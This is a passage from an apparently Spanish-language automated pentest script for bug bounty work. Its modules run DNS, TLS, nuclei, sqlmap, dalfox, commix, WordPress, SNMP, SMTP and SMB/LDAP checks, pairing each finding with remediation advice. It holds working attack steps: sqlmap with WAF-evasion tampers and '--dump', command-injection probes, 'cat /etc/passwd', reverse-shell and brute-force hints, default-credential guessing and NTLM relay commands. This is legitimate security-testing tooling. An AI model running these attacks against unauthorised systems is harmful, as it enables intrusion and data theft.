        "N/A" "Verificar que solo IPs autorizadas resuelvan al dominio." \
        "Revisar IPs en Shodan/Censys para servicios no documentados."
    echo
}

# ─── MÓDULO 18: DNSRECON — DNS COMPLETO ──────────────────────────
modulo_dnsrecon() {
    is_domain "$TARGET" || { warn "dnsrecon requiere dominio."; return; }
    command -v dnsrecon >/dev/null 2>&1 || { warn "dnsrecon no disponible: sudo apt install dnsrecon"; return; }

    log "MÓDULO 18: dnsrecon — DNS Completo (Zone Transfer, SPF, DMARC)"
    tip "Zone transfer puede revelar TODA la infraestructura interna del dominio."

    local out_file="${OUTPUT_DIR}/recon/dnsrecon.txt"
    cmd_show "dnsrecon -d ${TARGET} -t std,axfr,brt"

    dnsrecon -d "${TARGET}" -t std,axfr,brt 2>/dev/null | tee "${out_file}"

    if grep -qi "zone transfer\|axfr" "${out_file}" 2>/dev/null && \
       grep -qi "success\|records\|A " "${out_file}" 2>/dev/null; then
        add_finding "CRÍTICO" "DNS Zone Transfer Permitido" \
            "El servidor DNS permite AXFR. Toda la infraestructura DNS interna queda expuesta." \
            "10.0" \
            "Deshabilitar zone transfer público. Permitir solo entre nameservers autorizados via ACL." \
            "Extraer registros: dig axfr ${TARGET} @\$(dig NS ${TARGET} +short | head -1)"
        intel_log "CRÍTICO: Zone Transfer habilitado"
    fi

    local spf; spf=$(grep -iE "spf|v=spf" "${out_file}" 2>/dev/null | head -3)
    local dmarc; dmarc=$(grep -i "_dmarc\|dmarc" "${out_file}" 2>/dev/null | head -2)

    [[ -z "$spf" ]] && add_finding "MEDIO" "SPF No Configurado — Email Spoofing Posible" \
        "Sin SPF cualquiera puede enviar emails falsos desde @${TARGET}." \
        "5.4" \
        "Agregar TXT record: v=spf1 include:_spf.tu-proveedor.com ~all" \
        "Probar con: sendEmail o verificar en mxtoolbox.com/spf"

    [[ -z "$dmarc" ]] && add_finding "MEDIO" "DMARC No Configurado" \
        "Sin DMARC los emails falsificados no son bloqueados automáticamente." \
        "5.4" \
        "Agregar: _dmarc.${TARGET} TXT \"v=DMARC1; p=quarantine; rua=mailto:dmarc@${TARGET}\"" \
        "Validar en: https://dmarcian.com/dmarc-inspector/"

    local mx_records; mx_records=$(grep -iE "^MX|mail exchanger" "${out_file}" 2>/dev/null | head -5)
    [[ -n "$mx_records" ]] && add_finding "INFO" "Servidores de Correo (MX)" "<pre>${mx_records}</pre>" \
        "N/A" "Verificar que MX no exponga servidores internos." \
        "Enumerar usuarios: smtp-user-enum -M VRFY -U users.txt -t \$(dig MX ${TARGET} +short | head -1 | awk '{print \$2}')"

    ok "dnsrecon completado: ${out_file}"
    echo
}

# ─── MÓDULO 19: SSLSCAN — ANÁLISIS TLS/SSL ───────────────────────
modulo_sslscan() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return
    local has_tls=false
    for p in "${WEB_PORTS[@]}"; do [[ "$p" == "443" || "$p" == "8443" ]] && has_tls=true; done
    [[ "$ORIGINAL_URL" =~ ^https:// ]] && has_tls=true
    [[ "$has_tls" == "false" ]] && { warn "Sin TLS detectado. Saltando sslscan."; return; }

    command -v sslscan >/dev/null 2>&1 || { warn "sslscan no disponible: sudo apt install sslscan"; return; }

    log "MÓDULO 19: SSLScan — Análisis TLS/SSL"
    tip "TLS 1.0/1.1 y ciphers débiles son hallazgos Medium-High en Bug Bounty."

    local out_file="${OUTPUT_DIR}/web/sslscan.txt"
    cmd_show "sslscan --no-colour ${TARGET}"
    sslscan --no-colour "${TARGET}" 2>/dev/null | tee "${out_file}"
    [[ ! -s "$out_file" ]] && { warn "sslscan sin output."; return; }

    if grep -qi "TLSv1\.0\|SSLv3\|SSLv2" "${out_file}" 2>/dev/null; then
        local old_tls; old_tls=$(grep -iE "TLSv1\.0|SSLv3|SSLv2" "${out_file}" | grep -iv "disabled\|not offered" | head -5)
        [[ -n "$old_tls" ]] && add_finding "ALTO" "Protocolo TLS Obsoleto Habilitado" \
            "<pre>${old_tls}</pre>" "7.5" \
            "Deshabilitar TLS 1.0 y 1.1. Solo permitir TLS 1.2 y TLS 1.3." \
            "Apache: SSLProtocol all -SSLv3 -TLSv1 -TLSv1.1 | Nginx: ssl_protocols TLSv1.2 TLSv1.3;"
    fi

    if grep -qi "RC4\|3DES\|EXPORT\|NULL cipher" "${out_file}" 2>/dev/null; then
        local weak; weak=$(grep -iE "RC4|3DES|EXPORT|NULL cipher" "${out_file}" | grep -iv "disabled" | head -10)
        [[ -n "$weak" ]] && add_finding "ALTO" "Cipher Suites Débiles" \
            "<pre>${weak}</pre>" "7.5" \
            "Usar solo ciphers modernos: TLS_AES_256_GCM_SHA384, ECDHE-RSA-AES256-GCM-SHA384" \
            "Validar grado A en: https://www.ssllabs.com/ssltest/"
    fi

    grep -qi "heartbleed.*vulnerable\|heartbleed.*yes" "${out_file}" 2>/dev/null && \
        add_finding "CRÍTICO" "Heartbleed (CVE-2014-0160)" \
        "Servidor vulnerable a Heartbleed. Expone memoria con claves, contraseñas y sesiones." \
        "10.0" \
        "Actualizar OpenSSL inmediatamente. Revocar y regenerar todos los certificados SSL." \
        "Verificar: nmap -p 443 --script ssl-heartbleed ${TARGET}"

    grep -qi "expired\|self-signed" "${out_file}" 2>/dev/null && \
        add_finding "MEDIO" "Problema con Certificado TLS" \
        "$(grep -iE 'expired|self.signed' "${out_file}" | head -2)" \
        "5.3" \
        "Renovar certificado. Usar Let's Encrypt para certificados gratuitos y automáticos." \
        "openssl s_client -connect ${TARGET}:443 | openssl x509 -noout -dates"
    echo
}

# ─── MÓDULO 20: NUCLEI — CVE & MISCONFIG SCANNER ─────────────────
modulo_nuclei() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && { warn "Nuclei requiere puertos web."; return; }
    command -v nuclei >/dev/null 2>&1 || { warn "nuclei no disponible: sudo apt install nuclei && nuclei -update-templates"; return; }

    log "MÓDULO 20: Nuclei — CVE & Misconfiguration Scanner"
    tip "Nuclei es el estándar en Bug Bounty. 9000+ templates, CVEs con CVSS incluidos."

    local proto="http"; local port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local out_file="${OUTPUT_DIR}/web/nuclei_results.txt"

    local template_flags="-t exposures,misconfiguration,vulnerabilities,cves,technologies"
    [[ "$INTEL_CMS" == "wordpress" ]] && template_flags+=" -t wordpress" && intel_log "WP templates activados"
    [[ "$INTEL_WAF_DETECTED" == "true" ]] && template_flags+=" -H 'X-Forwarded-For: 127.0.0.1'"

    cmd_show "nuclei -u ${url} ${template_flags} -severity critical,high,medium -silent"

    nuclei -u "${url}" \
        ${template_flags} \
        -severity critical,high,medium,low \
        -o "${out_file}" \
        -silent \
        -timeout 10 \
        -rate-limit 50 \
        2>/dev/null

    if [[ -s "$out_file" ]]; then
        local crit high med
        crit=$(grep -c "\[critical\]" "${out_file}" 2>/dev/null || echo 0)
        high=$(grep -c "\[high\]"     "${out_file}" 2>/dev/null || echo 0)
        med=$( grep -c "\[medium\]"   "${out_file}" 2>/dev/null || echo 0)

        ok "Nuclei: CRÍTICO=${crit} ALTO=${high} MEDIO=${med}"

        local n_crit; n_crit=$(grep "\[critical\]" "${out_file}" | head -20)
        local n_high; n_high=$(grep "\[high\]"     "${out_file}" | head -20)

        [[ -n "$n_crit" ]] && add_finding "CRÍTICO" "Nuclei: ${crit} Vulnerabilidades Críticas" \
            "<pre>${n_crit}</pre>" "9.5" \
            "Revisar cada CVE en https://nvd.nist.gov y aplicar el parche correspondiente de inmediato." \
            "Ver detalles: nuclei -u ${url} -id TEMPLATE-ID | Usar searchsploit para exploits"

        [[ -n "$n_high" ]] && add_finding "ALTO" "Nuclei: ${high} Vulnerabilidades Altas" \
            "<pre>${n_high}</pre>" "7.8" \
            "Planificar corrección en siguiente sprint. Revisar templates para contexto de remediación." \
            "Ver output completo: ${out_file}"

        local cves_found; cves_found=$(grep -oE 'CVE-[0-9]{4}-[0-9]+' "${out_file}" 2>/dev/null | sort -u)
        [[ -n "$cves_found" ]] && add_finding "ALTO" "CVEs Confirmados por Nuclei" \
            "<pre>${cves_found}</pre>" "8.0" \
            "Consultar cada CVE en NVD y aplicar mitigaciones indicadas." \
            "searchsploit CVE-XXXX-XXXX para buscar exploits públicos"
    else
        ok "Nuclei: sin hallazgos críticos/altos."
        add_finding "INFO" "Nuclei Scan" "Sin vulnerabilidades conocidas detectadas con templates aplicados." \
            "N/A" "Mantener nuclei actualizado: nuclei -update-templates" \
            "Re-escanear cuando se publiquen nuevos CVEs relacionados al stack."
    fi
    echo
}

# ─── MÓDULO 21: SQLMAP — CONFIRMACIÓN SQLi ───────────────────────
modulo_sqlmap() {
    [[ "$INTEL_SQLI_FOUND" != "true" ]] && {
        warn "SQLi no detectado previamente (módulo 13). Saltando sqlmap."
        return
    }
    command -v sqlmap >/dev/null 2>&1 || { warn "sqlmap no disponible: sudo apt install sqlmap"; return; }

    log "MÓDULO 21: sqlmap — Confirmación Automática SQLi"
    tip "Confirma y explota SQLi encontrado por módulo 13. Requiere permiso explícito."

    local out_dir="${OUTPUT_DIR}/exploits/sqlmap"
    mkdir -p "$out_dir"

    local sqli_url="${ORIGINAL_URL:-}"
    [[ -f "${OUTPUT_DIR}/web/sqli_results.txt" ]] && \
        sqli_url=$(grep -oE 'https?://[^ ]+' "${OUTPUT_DIR}/web/sqli_results.txt" | head -1)
    [[ -z "$sqli_url" ]] && [[ ${#INTEL_INJECTABLE_URLS[@]} -gt 0 ]] && \
        sqli_url="${INTEL_INJECTABLE_URLS[0]}"
    [[ -z "$sqli_url" ]] && { warn "No hay URL SQLi para sqlmap."; return; }

    local waf_flags="--level=2 --risk=1 --batch"
    [[ "$INTEL_WAF_DETECTED" == "true" ]] && \
        waf_flags="--tamper=between,charencode,randomcase,space2comment --level=3 --risk=2 --delay=1 --batch"

    local dbms_flag=""
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " mysql "      ]] && dbms_flag="--dbms=mysql"
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " postgresql " ]] && dbms_flag="--dbms=postgresql"

    cmd_show "sqlmap -u ${sqli_url} --dbs ${waf_flags} ${dbms_flag}"

    sqlmap -u "${sqli_url}" --dbs ${waf_flags} ${dbms_flag} \
        --output-dir="${out_dir}" --timeout=30 2>/dev/null | tee "${out_dir}/output.txt"

    if grep -qi "is vulnerable\|parameter.*is.*injectable" "${out_dir}/output.txt" 2>/dev/null; then
        local db_names; db_names=$(grep -A5 "available databases" "${out_dir}/output.txt" | grep "\[" | head -10)
        add_finding "CRÍTICO" "SQLi CONFIRMADO por sqlmap" \
            "<b>URL:</b> ${sqli_url}<br><b>BDs expuestas:</b><pre>${db_names}</pre>" \
            "9.8" \
            "1) Usar Prepared Statements. 2) Validar y sanitizar toda entrada. 3) Mínimo privilegio en BD. 4) WAF como capa adicional (no única defensa)." \
            "Extraer datos: sqlmap -u '${sqli_url}' --dump --batch ${waf_flags}. Corregir queries vulnerables en código fuente."
        intel_log "SQLi CONFIRMADO por sqlmap"
    fi
    echo
}

# ─── MÓDULO 22: DALFOX — XSS AVANZADO ───────────────────────────
modulo_dalfox() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return
    command -v dalfox >/dev/null 2>&1 || {
        warn "dalfox no disponible."
        echo -e "  Instalar: ${C_CYN}sudo apt install dalfox${C_RST} o ${C_CYN}go install github.com/hahwul/dalfox/v2@latest${C_RST}"
        return
    }

    log "MÓDULO 22: Dalfox — XSS Avanzado (DOM-XSS, Reflected, Header)"
    tip "Dalfox detecta XSS que curl no puede: DOM-based, contexto JS, codificaciones complejas."

    local proto="http"; local port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local out_file="${OUTPUT_DIR}/web/dalfox_results.txt"

    local waf_flags=""
    [[ "$INTEL_WAF_DETECTED" == "true" ]] && waf_flags="--waf-evasion --delay 500"

    cmd_show "dalfox url ${url} --silence --output ${out_file} ${waf_flags}"
    dalfox url "${url}" --silence --output "${out_file}" ${waf_flags} --timeout 30 2>/dev/null

    if [[ ${#INTEL_INJECTABLE_URLS[@]} -gt 0 ]]; then
        local urls_file="/tmp/dalfox_urls.txt"
        printf '%s\n' "${INTEL_INJECTABLE_URLS[@]}" > "$urls_file"
        dalfox file "$urls_file" --silence >> "${out_file}" 2>/dev/null
        intel_log "Dalfox testeó ${#INTEL_INJECTABLE_URLS[@]} URLs adicionales de gobuster/arjun"
    fi

    if [[ -s "$out_file" ]] && grep -qi "VULN\|XSS\|Injected" "${out_file}" 2>/dev/null; then
        local xss_count; xss_count=$(grep -c "VULN\|Injected" "${out_file}" 2>/dev/null || echo 1)
        local xss_detail; xss_detail=$(grep -iE "VULN|Injected|payload" "${out_file}" | head -20)
        INTEL_XSS_FOUND=true
        add_finding "CRÍTICO" "XSS Confirmado por Dalfox (${xss_count} puntos)" \
            "<pre>${xss_detail}</pre>" "8.2" \
            "1) Implementar CSP estricto. 2) Escapar output HTML: htmlspecialchars(). 3) Usar frameworks con auto-escaping. 4) Validar input en servidor." \
            "Generar PoC para Bug Bounty: dalfox url 'URL' --mining-dict | Usar Burp Collaborator para blind XSS"
    else
        ok "Dalfox: sin XSS confirmado."
        add_finding "INFO" "XSS (Dalfox)" "No se confirmó XSS con Dalfox en URLs probadas." \
            "N/A" "Revisar manualmente con Burp Suite: XSS almacenado y DOM-based son más difíciles de detectar automáticamente." \
            "Revisar CSP actual: curl -sI ${url} | grep -i content-security-policy"
    fi
    echo
}

# ─── MÓDULO 23: COMMIX — COMMAND INJECTION ───────────────────────
modulo_commix() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return
    command -v commix >/dev/null 2>&1 || { warn "commix no disponible: sudo apt install commix"; return; }

    log "MÓDULO 23: commix — OS Command Injection"
    tip "Command injection = RCE completo. Máximo impacto en Bug Bounty."

    local proto="http"; local port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local target_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    [[ ${#INTEL_INJECTABLE_URLS[@]} -gt 0 ]] && target_url="${INTEL_INJECTABLE_URLS[0]}" && \
        intel_log "Commix usando URL de gobuster/arjun: ${target_url}"

    local out_file="${OUTPUT_DIR}/web/commix_results.txt"
    mkdir -p "${OUTPUT_DIR}/exploits/commix"
    cmd_show "commix --url=${target_url} --batch --output-dir=${OUTPUT_DIR}/exploits/commix"

    commix --url="${target_url}" --batch \
        --output-dir="${OUTPUT_DIR}/exploits/commix" \
        --timeout=20 2>/dev/null | tee "${out_file}"

    if grep -qi "vulnerable\|is injectable\|shell" "${out_file}" 2>/dev/null; then
        add_finding "CRÍTICO" "OS Command Injection (RCE) Detectado" \
            "<pre>$(head -20 "${out_file}")</pre>" "9.8" \
            "1) No pasar input al shell directamente. 2) Usar APIs nativas del lenguaje. 3) Whitelist de valores permitidos. 4) Escapar todos los caracteres especiales de shell." \
            "Intentar reverse shell. Documentar para reporte con: id, whoami, hostname, cat /etc/passwd"
        intel_log "CRÍTICO: RCE via Command Injection"
    else
        ok "commix: sin command injection detectado."
        add_finding "INFO" "Command Injection" "No se detectó OS injection en endpoints probados." \
            "N/A" "Revisar manualmente parámetros que procesen rutas, comandos o nombres de archivo." \
            "Probar: test;id | test&&whoami | test\`id\`"
    fi
    echo
}

# ─── MÓDULO 24: ARJUN — PARÁMETROS OCULTOS ──────────────────────
modulo_arjun() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return
    command -v arjun >/dev/null 2>&1 || {
        warn "arjun no disponible: pip3 install arjun --break-system-packages"
        return
    }

    log "MÓDULO 24: arjun — Parámetros HTTP Ocultos"
    tip "Los parámetros ocultos suelen ser: debug=true, admin=1, id=X (IDOR), redirect=URL (Open Redirect)."

    local proto="http"; local port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local out_json="${OUTPUT_DIR}/web/arjun_params.json"

    cmd_show "arjun -u ${url} --stable -oJ ${out_json}"
    arjun -u "${url}" --stable -oJ "${out_json}" 2>/dev/null

    if [[ -s "$out_json" ]]; then
        local params_raw
        params_raw=$(python3 -c "
import json
try:
    d=json.load(open('${out_json}'))
    for url,p in d.items():
        if p: print(url+': '+', '.join(p))
except: pass
" 2>/dev/null)

        if [[ -n "$params_raw" ]]; then
            ok "Parámetros ocultos: ${params_raw}"
            local suspicious; suspicious=$(echo "$params_raw" | grep -iE "debug|admin|test|cmd|exec|file|path|redirect|url|key|token|pass")

            add_finding "ALTO" "Parámetros HTTP Ocultos Detectados" \
                "<pre>${params_raw}</pre>" "7.5" \
                "Auditar cada parámetro. Eliminar debug/admin en producción. Implementar autorización en todos." \
                "Probar cada parámetro para SQLi, XSS, IDOR, Path Traversal, SSRF, Open Redirect."

            [[ -n "$suspicious" ]] && add_finding "CRÍTICO" "Parámetros de Alto Riesgo" \
                "<pre>${suspicious}</pre>" "9.0" \
                "Deshabilitar parámetros debug/admin en producción de inmediato." \
                "Probar: ?debug=true ?admin=1 ?redirect=https://evil.com ?file=../etc/passwd"

            while IFS= read -r p; do
                INTEL_INJECTABLE_URLS+=("${url}?${p}=TEST")
            done < <(echo "$params_raw" | grep -oE '[a-zA-Z_]+ ' | tr -d ' ' | head -20)

            intel_log "arjun: ${#INTEL_INJECTABLE_URLS[@]} targets nuevos para SQLi/XSS/IDOR"
        fi
    else
        ok "arjun: sin parámetros ocultos adicionales."
        add_finding "INFO" "Parámetros Ocultos (arjun)" "Sin parámetros HTTP no documentados detectados." \
            "N/A" "Re-verificar en endpoints de API con métodos POST y PUT." \
            "Probar manualmente en formularios y llamadas AJAX."
    fi
    echo
}

# ─── MÓDULO 25: WPSCAN — WORDPRESS ───────────────────────────────
modulo_wpscan() {
    if [[ "$INTEL_CMS" != "wordpress" ]]; then
        log "MÓDULO 25: WPScan — WordPress no detectado. Saltando."
        return
    fi
    command -v wpscan >/dev/null 2>&1 || { warn "wpscan no disponible: sudo apt install wpscan"; return; }

    log "MÓDULO 25: WPScan — WordPress Security Audit"
    tip "WordPress tiene el 40% de los sitios web. Plugins obsoletos = CVEs garantizados."

    local proto="http"; local port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local out_file="${OUTPUT_DIR}/web/wpscan_results.txt"
    intel_log "WordPress confirmado → ejecutando WPScan completo"

    cmd_show "wpscan --url ${url} --enumerate u,ap,at,dbe --no-banner --format cli-no-colour"
    wpscan --url "${url}" --enumerate u,ap,at,dbe --no-banner \
        --format cli-no-colour -o "${out_file}" 2>/dev/null

    if [[ -s "$out_file" ]]; then
        local wp_users; wp_users=$(grep -A2 "WordPress users" "${out_file}" | grep " - " | head -10)
        [[ -n "$wp_users" ]] && add_finding "ALTO" "Usuarios WordPress Enumerados" \
            "<pre>${wp_users}</pre>" "7.5" \
            "Deshabilitar enumeración: redirigir /wp-json/wp/v2/users. Usar user slugs no predecibles." \
            "Probar credenciales: admin/admin, admin/password123. Usar hydra para brute force."

        local vuln_pl; vuln_pl=$(grep -A3 "vulnerabilit\|Vulnerability" "${out_file}" | head -30)
        [[ -n "$vuln_pl" ]] && add_finding "CRÍTICO" "Plugins WordPress Vulnerables" \
            "<pre>${vuln_pl}</pre>" "9.0" \
            "Actualizar todos los plugins. Desinstalar plugins no usados. Verificar en wpscan.com/plugins." \
            "wpscan --url ${url} --api-token TU_TOKEN para CVEs completos y remediación."

        local wp_ver; wp_ver=$(grep -iE "WordPress version" "${out_file}" | head -1)
        [[ -n "$wp_ver" ]] && add_finding "INFO" "Versión WordPress Detectada" "<pre>${wp_ver}</pre>" \
            "N/A" "Mantener WordPress actualizado siempre." \
            "Verificar actualizaciones en: https://wordpress.org/news/"
    fi
    echo
}

# ─── MÓDULO 26: CRT.SH — CERTIFICATE TRANSPARENCY ───────────────
modulo_crtsh() {
    is_domain "$TARGET" || return

    log "MÓDULO 26: crt.sh — Certificate Transparency"
    tip "100% pasivo. Revela subdominios desde logs públicos de certificados."

    local out_file="${OUTPUT_DIR}/recon/crtsh_subdomains.txt"
    cmd_show "curl -s https://crt.sh/?q=%.${TARGET}&output=json"

    curl -skL --max-time 20 "https://crt.sh/?q=%.${TARGET}&output=json" 2>/dev/null | \
        python3 -c "
import json,sys
try:
    data=json.load(sys.stdin)
    names=set()
    for e in data:
        for n in e.get('name_value','').split('\n'):
            n=n.strip().lstrip('*.')
            if n and '.' in n: names.add(n)
    [print(n) for n in sorted(names)]
except: pass
" 2>/dev/null | tee "${out_file}"

    if [[ -s "$out_file" ]]; then
        local count; count=$(wc -l < "${out_file}")
        ok "crt.sh: ${count} subdominios encontrados"

        local sensitive_subs
        sensitive_subs=$(grep -iE "dev\.|staging\.|test\.|admin\.|internal\.|vpn\.|git\.|ci\.|jenkins\." "${out_file}" 2>/dev/null)

        add_finding "INFO" "Subdominios via Certificate Transparency (${count})" \
            "<pre>$(head -30 "${out_file}")</pre>" "N/A" \
            "Inventariar subdominios. Dar de baja los no usados para reducir superficie de ataque." \
            "Verificar subdomain takeover: nuclei -t takeovers/ -l ${out_file}"

        [[ -n "$sensitive_subs" ]] && add_finding "MEDIO" "Subdominios Sensibles Expuestos" \
            "<pre>${sensitive_subs}</pre>" "5.3" \
            "Staging/dev no deben ser públicos. Proteger con VPN o autenticación básica." \
            "Verificar acceso a cada subdominio. Buscar credenciales por defecto y debug activo."

        while IFS= read -r sub; do
            [[ -n "$sub" ]] && INTEL_SUBDOMAINS+=("$sub")
        done < "${out_file}"
        intel_log "crt.sh: ${count} subdominios registrados"
    fi
    echo
}

# ─── MÓDULO 27: SMTP-USER-ENUM ───────────────────────────────────
modulo_smtp_enum() {
    echo "$OPEN_PORTS_CSV" | grep -qE "(^|,)(25|465|587|2525)(,|$)" || return
    command -v smtp-user-enum >/dev/null 2>&1 || { warn "smtp-user-enum: sudo apt install smtp-user-enum"; return; }

    log "MÓDULO 27: smtp-user-enum — Enumeración de Usuarios SMTP"
    tip "VRFY/EXPN confirman usuarios sin autenticación. Vector para phishing y password spray."

    local out_file="${OUTPUT_DIR}/recon/smtp_users.txt"
    local wordlist="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
    [[ ! -f "$wordlist" ]] && wordlist="/usr/share/wordlists/metasploit/unix_users.txt"
    [[ ! -f "$wordlist" ]] && { warn "Wordlist de usuarios no encontrada."; return; }

    cmd_show "smtp-user-enum -M VRFY -U ${wordlist} -t ${TARGET}"
    smtp-user-enum -M VRFY -U "${wordlist}" -t "${TARGET}" 2>/dev/null | tee "${out_file}"

    if grep -qi "exists\|250\|valid" "${out_file}" 2>/dev/null; then
        local valid_users; valid_users=$(grep -iE "exists|250|valid" "${out_file}" | grep -v "not exist" | head -20)
        add_finding "ALTO" "Usuarios Válidos via SMTP VRFY" \
            "<pre>${valid_users}</pre>" "7.5" \
            "Deshabilitar VRFY y EXPN en Postfix: disable_vrfy_command=yes. Revisar configuración Sendmail." \
            "Usar usuarios en password spray o credential stuffing contra webmail/VPN/SSH."
        intel_log "Usuarios SMTP válidos encontrados"
    else
        ok "SMTP: sin usuarios confirmados via VRFY."
    fi
    echo
}

# ─── MÓDULO 28: SNMPWALK — SNMP ──────────────────────────────────
modulo_snmp() {
    echo "$OPEN_PORTS_CSV" | grep -qE "(^|,)161(,|$)" || return
    command -v snmpwalk >/dev/null 2>&1 || { warn "snmpwalk: sudo apt install snmp"; return; }

    log "MÓDULO 28: snmpwalk — SNMP Enumeration"
    tip "SNMP expone configuración de red, interfaces, rutas, procesos y credenciales."

    local out_file="${OUTPUT_DIR}/recon/snmp_walk.txt"
    local communities=("public" "private" "community" "manager" "snmp" "cisco" "admin")

    for comm in "${communities[@]}"; do
        local result; result=$(snmpwalk -v2c -c "${comm}" "${TARGET}" 2>/dev/null | head -30)
        if [[ -n "$result" ]]; then
            ok "SNMP accesible con community: ${comm}"
            echo "$result" >> "${out_file}"
            add_finding "CRÍTICO" "SNMP con Community String por Defecto: '${comm}'" \
                "<pre>$(head -20 "${out_file}")</pre>" "9.8" \
                "1) Cambiar community strings. 2) Usar SNMPv3 con autenticación. 3) Restringir acceso por ACL/IP. 4) Deshabilitar si no se usa." \
                "Dump completo: snmpwalk -v2c -c ${comm} ${TARGET} | Buscar: interfaces, rutas, procesos, config"
            intel_log "SNMP abierto con '${comm}' → infraestructura expuesta"
            break
        fi
    done
    echo
}

# ─── MÓDULO 29: CRACKMAPEXEC — SMB/LDAP ──────────────────────────
modulo_cme() {
    echo "$OPEN_PORTS_CSV" | grep -qE "(^|,)(445|139|389|5985)(,|$)" || return
    local CME_CMD=""
    command -v crackmapexec >/dev/null 2>&1 && CME_CMD="crackmapexec"
    command -v cme           >/dev/null 2>&1 && CME_CMD="cme"
    [[ -z "$CME_CMD" ]] && { warn "crackmapexec no disponible: sudo apt install crackmapexec"; return; }

    log "MÓDULO 29: CrackMapExec — SMB/LDAP/WinRM Enumeration"
    tip "CME identifica null sessions, SMB signing, versiones y dominios AD sin credenciales."

    local out_file="${OUTPUT_DIR}/recon/cme_results.txt"

    if echo "$OPEN_PORTS_CSV" | grep -qE "(^|,)(445|139)(,|$)"; then
        cmd_show "${CME_CMD} smb ${TARGET} --shares"
        ${CME_CMD} smb "${TARGET}" --shares 2>/dev/null | tee -a "${out_file}"

        grep -qi "null\|anonymous\|\[\+\]" "${out_file}" 2>/dev/null && \
            add_finding "ALTO" "SMB: Sesión Anónima Posible" \
            "<pre>$(head -20 "${out_file}")</pre>" "7.5" \
            "Deshabilitar sesiones null. Requerir firma SMB. Actualizar a SMBv3." \
            "Enumerar shares: smbclient -L //${TARGET} -N | Montar: smbclient //${TARGET}/SHARE -N"

        grep -qi "signing:False\|signing: False" "${out_file}" 2>/dev/null && \
            add_finding "MEDIO" "SMB Signing Deshabilitado" \
            "Permite ataques NTLM Relay para captura y relay de hashes." "6.8" \
            "Habilitar SMB Signing via GPO: Microsoft network server: Digitally sign communications = Enabled" \
            "Explotar con: responder -I eth0 + ntlmrelayx.py -t smb://${TARGET}"
    fi

    if echo "$OPEN_PORTS_CSV" | grep -qE "(^|,)389(,|$)"; then
        cmd_show "${CME_CMD} ldap ${TARGET} --users --groups"
        ${CME_CMD} ldap "${TARGET}" --users --groups 2>/dev/null | tee -a "${out_file}"

        grep -qi "\[\+\]\|user\|group" "${out_file}" 2>/dev/null && \
            add_finding "ALTO" "LDAP: Enumeración AD Anónima" \
            "<pre>$(grep -iE 'user:|group:|cn=' "${out_file}" | head -20)</pre>" "7.5" \
            "Deshabilitar LDAP anónimo. Requerir autenticación. Implementar LDAPS (TLS)." \
            "Dump completo: ldapsearch -x -H ldap://${TARGET} -b 'dc=dominio,dc=com'"
        intel_log "AD: usuarios/grupos expuestos via LDAP"
    fi
    echo
}



# ════════════════════════════════════════════════════════════════
# HELPER: Rutas críticas por framework detectado
# ════════════════════════════════════════════════════════════════
_build_framework_routes() {
    INTEL_FRAMEWORK_ROUTES=()
    local base_url="$1"

    case "$INTEL_FRAMEWORK_JS" in
        nextjs)
            INTEL_FRAMEWORK_ROUTES+=("/_next/static/" "/_next/data/" "/api/" "/api/auth/" "/_next/webpack-hmr" "/.env.local" "/.env")
            intel_log "Next.js routes: /_next/, /api/, .env.local registradas"
            ;;
        nuxt)
            INTEL_FRAMEWORK_ROUTES+=("/_nuxt/" "/api/" "/_nuxt/static/" "/.env" "/.nuxtignore")
            ;;
        astro)
            INTEL_FRAMEWORK_ROUTES+=("/_astro/" "/dist/" "/src/" "/.env" "/astro.config.mjs")
            ;;
        svelte)
            INTEL_FRAMEWORK_ROUTES+=("/.svelte-kit/" "/api/" "/src/" "/.env" "/svelte.config.js")
            ;;
        remix)
            INTEL_FRAMEWORK_ROUTES+=("/build/" "/app/" "/routes/" "/.env")
            ;;
        gatsby)
            INTEL_FRAMEWORK_ROUTES+=("/page-data/" "/static/" "/.cache/" "/.env")
            ;;
    esac

    case "$INTEL_FRAMEWORK_BACKEND" in
        laravel)
            INTEL_FRAMEWORK_ROUTES+=("/.env" "/storage/logs/laravel.log" "/telescope" "/horizon" "/telescope/api/requests" "/api/documentation" "/_ignition/health-check" "/laravel-websockets" "/phpinfo.php")
            intel_log "Laravel routes: .env, telescope, horizon registradas"
            ;;
        symfony)
            INTEL_FRAMEWORK_ROUTES+=("/_profiler" "/_wdt" "/app_dev.php" "/config.php" "/.env" "/var/log/dev.log" "/.env.local" "/app/cache/" "/phpinfo.php")
            intel_log "Symfony: /_profiler (debug toolbar) registrado"
            ;;
        django)
            INTEL_FRAMEWORK_ROUTES+=("/admin/" "/admin/login/" "/__debug__/" "/api/" "/api/schema/" "/api/docs/" "/.env" "/settings.py" "/manage.py")
            intel_log "Django: /admin/ y debug toolbar registrados"
            ;;
        fastapi)
            INTEL_FRAMEWORK_ROUTES+=("/docs" "/redoc" "/openapi.json" "/api/" "/health" "/metrics" "/.env")
            intel_log "FastAPI: /docs y /redoc (EXPUESTOS por default!) registrados"
            add_finding "ALTO" "FastAPI Detectado — Swagger Posiblemente Expuesto" \
                "FastAPI expone /docs y /redoc por defecto en producción si no se configura correctamente." \
                "7.5" \
                "Deshabilitar en producción: FastAPI(docs_url=None, redoc_url=None)" \
                "Verificar: curl ${base_url}/docs | curl ${base_url}/openapi.json"
            ;;
        flask)
            INTEL_FRAMEWORK_ROUTES+=("/console" "/_debug" "/.env" "/config.py" "/wsgi.py" "/requirements.txt")
            intel_log "Flask: /console (debug mode RCE!) registrado"
            ;;
        nestjs)
